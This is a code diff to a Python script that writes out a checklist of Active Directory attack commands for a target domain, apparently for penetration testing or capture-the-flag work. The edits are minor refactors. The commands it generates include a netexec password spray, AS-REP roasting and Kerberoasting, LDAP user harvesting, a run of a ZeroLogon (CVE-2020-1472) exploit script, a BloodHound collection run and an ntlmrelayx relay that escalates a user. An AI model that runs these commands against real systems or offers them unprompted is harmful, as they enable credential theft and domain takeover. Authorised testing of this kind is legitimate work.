@@ -53,6 +53,7 @@ def create_ad_enumeration_file(target_ip, hostname, domain, local_ip, user, pass
 
         # Pre-creds password spray with files
         if not has_creds:
+            f.write("# Try your users list as a password list\n")
             f.write(f"netexec smb {domain} -u users.txt -p users.txt --continue-on-success\n\n")
 
         # AS Rep Roasting
@@ -63,7 +64,7 @@ def create_ad_enumeration_file(target_ip, hostname, domain, local_ip, user, pass
         f.write("# Kerberoasting\n")
         if not has_creds:
             f.write("# Kerberoasting as a guest\n")
-            f.write(f"GetUserSPNs.py -target-domain {domain} -usersfile users.txt -dc-ip {hostname}.{domain} {domain}/guest -no-pass\n")
+            f.write(f"GetUserSPNs.py -target-domain {domain} -usersfile users.txt -dc-ip {hostname}.{domain} {domain}/guest -no-pass\n\n")
         if has_creds:
             f.write("# Authenticated Kerberoasting\n")
             f.write(f"GetUserSPNs.py -request -dc-ip {target_ip} {domain}/{user} -save -outputfile GetUserSPNs.out\n")
@@ -73,18 +74,17 @@ def create_ad_enumeration_file(target_ip, hostname, domain, local_ip, user, pass
         # LDAP enumeration
         f.write("# LDAP Enumeration\n")
         f.write("Run without any pipes first to see if any data shows up.\n")
-        f.write(f"ldapsearch -x -H ldap://{target_ip} -b \"dc={domain.split('.')[0]},dc={domain.split('.')[1]}\" | grep 'userPrincipalName' | tr '@' ' ' | awk '{{print $2}}' > users.txt\n\n")
+        base_dn = ",".join(f"dc={part}" for part in domain.split("."))
+        f.write(f"ldapsearch -x -H ldap://{target_ip} -b \"{base_dn}\" | grep 'userPrincipalName' | tr '@' ' ' | awk '{{print $2}}' > users.txt\n\n")
 
         # ZeroLogon check
         f.write("# ZeroLogon Check\n")
         f.write(f"sudo python ~/tools/CVE-2020-1472-master/cve-2020-1472-exploit.py {hostname} {target_ip}\n\n")
 
         # Bloodhound CE Python
-        f.write("# Bloodhound CE Python ingestor\n")
         if has_creds:
+            f.write("# Bloodhound CE Python ingestor\n")
             f.write(f"bloodhound-ce-python -c ALL -u '{user}' -p '{password}' -d {domain} -dc {hostname}.{domain} -ns {target_ip}\n\n")
-        else:
-            f.write(f"bloodhound-ce-python -c ALL -u 'guest' -p '' -d {domain} -dc {hostname}.{domain} -ns {target_ip}\n\n")
 
         # Powerview.py enumeration
         if has_creds:
@@ -99,7 +99,7 @@ def create_ad_enumeration_file(target_ip, hostname, domain, local_ip, user, pass
             f.write(f"netexec smb {target_ip} -u users.txt -p '{password}' --continue-on-success\n\n")
 
         # RemotePotato check
-        if has_creds:
+        if has_creds and local_ip:
             f.write("# RemotePotato Check\n")
             f.write(f"sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{target_ip}:9999\n")
             f.write(f"sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -t ldap://{target_ip} --no-wcf-server --escalate-user normal_user\n")
@@ -137,11 +137,17 @@ def create_ad_enumeration_file(target_ip, hostname, domain, local_ip, user, pass
     print("output.txt file generated successfully.")
 
 if __name__ == "__main__":
-    target_ip = input("Enter Target IP: ")
-    hostname = input("Enter Hostname: ")
-    domain = input("Enter Domain: ")
-    local_ip = input("Enter Local IP: ")
-    user = input("Enter User can be blank: ")
-    password = input("Enter Password can be blank: ")
+    target_ip = input("Enter Target IP: ").strip()
+    hostname = input("Enter Hostname: ").strip()
+    domain = input("Enter Domain: ").strip()
+
+    user = input("Enter User (leave blank if none): ").strip()
+    password = input("Enter Password (leave blank if none): ").strip()
+
+    has_creds = bool(user and password)
+    local_ip = ""
+
+    if has_creds:
+        local_ip = input("Enter Local IP: ").strip()
 
     create_ad_enumeration_file(target_ip, hostname, domain, local_ip, user, password)
